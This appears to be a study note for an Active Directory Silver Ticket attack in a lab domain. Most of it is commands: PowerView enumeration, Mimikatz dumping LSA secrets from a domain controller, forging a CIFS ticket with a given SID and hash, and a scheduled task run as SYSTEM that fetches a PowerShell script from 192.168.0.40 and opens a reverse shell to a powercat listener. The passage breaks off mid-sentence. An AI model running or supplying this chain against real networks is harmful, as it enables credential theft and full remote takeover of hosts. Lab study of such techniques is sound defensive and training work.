lets collect required things for this attack

____

Domain name with this PowerView command `Get-NetDomain`

![[Pasted image 20251221101538.png]]

____

Get Domian SID with this Command `Get-DomainSID`

![[Pasted image 20251221101545.png]]

to extract the lsa secrets from the domain controller we need domain controller FQDN

use this command to get all the Domain Controllers

`Get-NetDomainController | Select Name`

![[Pasted image 20251221101551.png]]

____

Now Extract LSA Secrets from Domain Controller with this command

`Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName DC02.UNIVERSE.COM`

![[Pasted image 20251221101610.png]]
![[Pasted image 20251221101623.png]]

____

Use this command to create a Silver Ticket for ”Service Windows File Share (CIFS)"

`Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:universe.com /sid:S-1-5-21-3323191838-1711971207-1097898698 /rc4:a4055c4180dbb04c1c159d56091a4d73 /target:universe-host.universe.com /service:cifs /ptt"'`

![[Pasted image 20251221101640.png]]

____

Now we can access shares on our target machine, use below command to list `C$` share

`ls \\universe-host.universe.com\C$`

![[Pasted image 20251221101644.png]]

____

We can also check this Silver ticket by using this command `klist` on our windows machine's current powershell session

![[Pasted image 20251221101649.png]]

____

We can also Delete the current Tickets from our powershell session with this command `klist purge`

![[Pasted image 20251221101656.png]]

____

to create Silver tickets we need SPN's to create a service Ticket

here is the spn which is created by default on the Active Directory named as “HOST” followed by the machine's Hostname.

![[Pasted image 20251221101700.png]]

____

We can create `HOST` Service tickets to run commands on target and perform system level actions.

use this command to create a HOST Service Silver Ticket.

`schtasks /create /S universe-host.universe.com /SC Weekly /RU "NT Authority\SYSTEM" /TN "REVSHELL011" /TR “powershell.exe -c iex (iwr http://192.168.0.40/Invoke-PowerShellTcp.ps1 -UseBasicParsing); Invoke-PowerShellTcp -Reverse -IPAddress 192.168.0.37 -Port 443”`

![[Pasted image 20251221101706.png]]

____

start the powercat listener on to the attacker machine to catch the reverse shell.

`powercat -l -p 443 -v -t 1024`

![[Pasted image 20251221101712.png]]

____

Query scheduled tasks on remote hosts

`schtasks /query /S universe-host.universe.com /TN "REVSHELL011"`

![[Pasted image 20251221101721.png]]

____

Run the Scheduled Tasks on the target

`schtasks /Run /S universe-host.universe.com /TN "REVSHELL011"`

![[Pasted image 20251221101728.png]]

____

We will receive the Reverse Shell on our Listener

![[Pasted image 20251221101734.png]]

_Now We have a Shell we can Run any command we want do what ever we want_

____

Lets 1st Try perform the action on our target